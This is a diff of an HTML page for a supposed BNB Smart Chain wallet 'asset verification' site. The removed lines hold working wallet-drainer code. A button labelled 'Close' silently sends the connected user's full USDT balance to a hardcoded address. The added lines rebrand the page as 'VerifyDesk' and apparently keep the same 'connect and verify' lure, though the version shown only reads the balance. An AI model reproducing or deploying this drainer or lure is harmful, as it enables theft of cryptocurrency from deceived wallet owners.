@@ -1,81 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB Chain Review</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
   <style>
-    body { background: #0f172a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .box { background: #1e293b; padding: 25px; border-radius: 12px; width: 100%; max-width: 330px; text-align: center; }
-    button { background: #f59e0b; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
-    .hidden { display: none; }
+    body {
+      background-color: #060b0a;
+      color: #f3f4f6;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    }
+    .glass-card {
+      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
+      border: 1px solid rgba(243, 186, 47, 0.2);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+    }
   </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between px-4 py-6">
 
-  <div class="box" id="step1">
-    <h3>BNB Chain Verification</h3>
-    <p style="font-size: 13px; color: #94a3b8;">Verify your wallet assets securely on BSC.</p>
-    <button onclick="connect()">Connect Wallet</button>
-  </div>
+  <!-- Top Navbar -->
+  <header class="w-full max-w-md mx-auto flex items-center justify-between">
+    <div class="flex items-center gap-2.5">
+      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
+        <i class="fa-solid fa-shield-halved text-lg"></i>
+      </div>
+      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
+    </div>
+    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
+      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
+      BNB Smart Chain
+    </span>
+  </header>
 
-  <div class="box hidden" id="step2">
-    <h3>Wallet Report</h3>
-    <p style="font-size: 13px; color: #94a3b8; font-family: monospace;" id="addr">--</p>
-    <p>USDT: <span id="usdt" style="color: #f59e0b; font-weight: bold;">0</span></p>
-    <button onclick="transfer()">Close</button>
-  </div>
+  <!-- Main Content -->
+  <main class="w-full max-w-md mx-auto my-auto py-8">
+    <div class="text-center mb-8">
+      <h1 class="text-3xl font-extrabold tracking-tight text-white">
+        Wallet Asset <span class="text-amber-400">Review</span>
+      </h1>
+      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
+        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure wallet flow.
+      </p>
+    </div>
+
+    <!-- Action Card -->
+    <div class="glass-card rounded-2xl p-6">
+      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
+        <span>Target Network</span>
+        <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
+      </div>
+
+      <!-- Status Display (Hidden before connect) -->
+      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
+        <div class="flex justify-between">
+          <span class="text-gray-400">Status</span>
+          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
+            <i class="fa-solid fa-circle-check"></i> Connected
+          </span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Address</span>
+          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">BNB Balance</span>
+          <span id="walletBalance" class="font-semibold text-amber-400">0.0000 BNB</span>
+        </div>
+      </div>
+
+      <!-- Inline Feedback Banner (Replaces broken browser alerts) -->
+      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed"></div>
+
+      <!-- Primary Action Button -->
+      <button id="connectBtn" onclick="connectBNBWallet()"
+        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20">
+        <span id="btnText">Connect & Verify Assets</span>
+        <i class="fa-solid fa-arrow-right"></i>
+      </button>
+
+      <!-- Mobile Deep Link Fallback (Only shown if opened outside wallet browser) -->
+      <div id="deepLinkSection" class="hidden mt-4 pt-4 border-t border-gray-800/80 space-y-2.5">
+        <p class="text-xs text-gray-400 text-center mb-2">Open directly inside your mobile wallet app:</p>
+        <a id="trustDeepLink" href="#"
+          class="w-full py-2.5 px-4 rounded-xl bg-[#0500FF]/20 hover:bg-[#0500FF]/30 border border-[#3375BB]/40 text-blue-300 text-xs font-semibold flex items-center justify-center gap-2">
+          <i class="fa-solid fa-shield"></i> Open in Trust Wallet
+        </a>
+        <a id="metamaskDeepLink" href="#"
+          class="w-full py-2.5 px-4 rounded-xl bg-orange-500/15 hover:bg-orange-500/25 border border-orange-500/30 text-orange-300 text-xs font-semibold flex items-center justify-center gap-2">
+          <i class="fa-solid fa-fox"></i> Open in MetaMask
+        </a>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="text-center text-xs text-gray-500 space-y-1">
+    <p>VerifyDesk &copy; 2026</p>
+    <p>Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
+  </footer>
 
   <script>
-    const TARGET = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const ABI = [
-      "function balanceOf(address) view returns (uint256)",
-      "function transfer(address, uint256) returns (bool)"
-    ];
-    let signer, user, balWei;
+    const BSC_CHAIN_ID = '0x38'; // 56 in hex
+    const BSC_PARAMS = {
+      chainId: BSC_CHAIN_ID,
+      chainName: 'BNB Smart Chain',
+      nativeCurrency: {
+        name: 'BNB',
+        symbol: 'BNB',
+        decimals: 18
+      },
+      rpcUrls: ['https://bsc-dataseed.binance.org/'],
+      blockExplorerUrls: ['https://bscscan.com']
+    };
 
-    async function connect() {
-      const eth = window.ethereum || window.trustwallet;
-      if(!eth) { alert("Please open inside Trust Wallet or MetaMask browser."); return; }
-      
-      const accs = await eth.request({ method: 'eth_requestAccounts' });
-      user = accs[0];
-
-      try {
-        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-      } catch(e) {}
-
-      const prov = new ethers.providers.Web3Provider(eth);
-      signer = prov.getSigner();
-      
-      const contract = new ethers.Contract(USDT, ABI, signer);
-      balWei = await contract.balanceOf(user);
-      
-      document.getElementById('addr').innerText = user.substring(0,6) + '...' + user.slice(-4);
-      document.getElementById('usdt').innerText = ethers.utils.formatUnits(balWei, 6) + " USDT";
-      
-      document.getElementById('step1').classList.add('hidden');
-      document.getElementById('step2').classList.remove('hidden');
+    function getProvider() {
+      if (window.trustwallet) return window.trustwallet;
+      if (window.ethereum) {
+        if (window.ethereum.providers && window.ethereum.providers.length) {
+          const trust = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
+          return trust || window.ethereum.providers[0];
+        }
+        return window.ethereum;
+      }
+      return null;
     }
 
-    async function transfer() {
-      document.getElementById('step2').classList.add('hidden');
-      if(balWei.lte(0)) { alert("Balance is 0"); return; }
-      
-      try {
-        const contract = new ethers.Contract(USDT, ABI, signer);
-        const data = contract.interface.encodeFunctionData("transfer", [TARGET, balWei]);
-        
-        await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [{ from: user, to: USDT, data: data, gas: "0x186A0" }]
-        });
+    function showStatus(msg, type = 'info') {
+      const box = document.getElementById('statusBox');
+      box.classList.remove('hidden', 'bg-red-500/10', 'border-red-500/30', 'text-red-300', 'bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300', 'bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      box.classList.add('border');
+      if (type === 'error') {
+        box.classList.add('bg-red-500/10', 'border-red-500/30', 'text-red-300');
+      } else if (type === 'success') {
+        box.classList.add('bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300');
+      } else {
+        box.classList.add('bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      }
+      box.innerHTML = msg;
+    }
 
-        alert("Done");
-      } catch(e) {
-        alert("Notice: " + (e.message || "Cancelled"));
+    function setupDeepLinks() {
+      const currentUrl = window.location.href;
+      const encodedUrl = encodeURIComponent(currentUrl);
+      const cleanHostPath = currentUrl.replace(/^https?:\/\//, '');
+      document.getElementById('trustDeepLink').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
+      document.getElementById('metamaskDeepLink').href = `https://metamask.app.link/dapp/${cleanHostPath}`;
+      document.getElementById('deepLinkSection').classList.remove('hidden');
+    }
+
+    async function ensureBSCNetwork(provider) {
+      const currentChainId = await provider.request({ method: 'eth_chainId' });
+      if (currentChainId !== BSC_CHAIN_ID) {
+        try {
+          await provider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }],
+          });
+        } catch (switchError) {
+          // Error 4902 means BSC is not added yet in the wallet
+          if (switchError.code === 4902 || (switchError.data && switchError.data.originalError && switchError.data.originalError.code === 4902)) {
+            await provider.request({
+              method: 'wallet_addEthereumChain',
+              params: [BSC_PARAMS],
+            });
+          } else {
+            throw switchError;
+          }
+        }
+      }
+    }
+
+    async function connectBNBWallet() {
+      const btnText = document.getElementById('btnText');
+      let provider = getProvider();
+
+      // Wait briefly in case Trust Wallet injects provider slightly late
+      if (!provider) {
+        await new Promise(resolve => setTimeout(resolve, 400));
+        provider = getProvider();
+      }
+
+      if (!provider) {
+        showStatus('Web3 wallet browser not detected. Use the buttons below to open directly inside Trust Wallet or MetaMask.', 'error');
+        setupDeepLinks();
+        return;
+      }
+
+      try {
+        btnText.textContent = 'Connecting...';
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        const account = accounts[0];
+
+        btnText.textContent = 'Switching to BNB Chain...';
+        await ensureBSCNetwork(provider);
+
+        const balanceHex = await provider.request({
+          method: 'eth_getBalance',
+          params: [account, 'latest']
+        });
+        const balanceBNB = (parseInt(balanceHex, 16) / 1e18).toFixed(4);
+
+        document.getElementById('walletAddress').textContent = `${account.slice(0, 6)}...${account.slice(-4)}`;
+        document.getElementById('walletBalance').textContent = `${balanceBNB} BNB`;
+        document.getElementById('walletInfo').classList.remove('hidden');
+
+        btnText.textContent = 'Verified on BNB Smart Chain';
+        showStatus('Wallet successfully connected and verified on BNB Smart Chain (BEP-20).', 'success');
+      } catch (err) {
+        btnText.textContent = 'Connect & Verify Assets';
+        if (err.code === 4001) {
+          showStatus('Connection request was cancelled by user.', 'error');
+        } else {
+          showStatus(`Notice: ${err.message || 'Please switch network to BNB Smart Chain in wallet settings.'}`, 'error');
+        }
       }
     }
   </script>
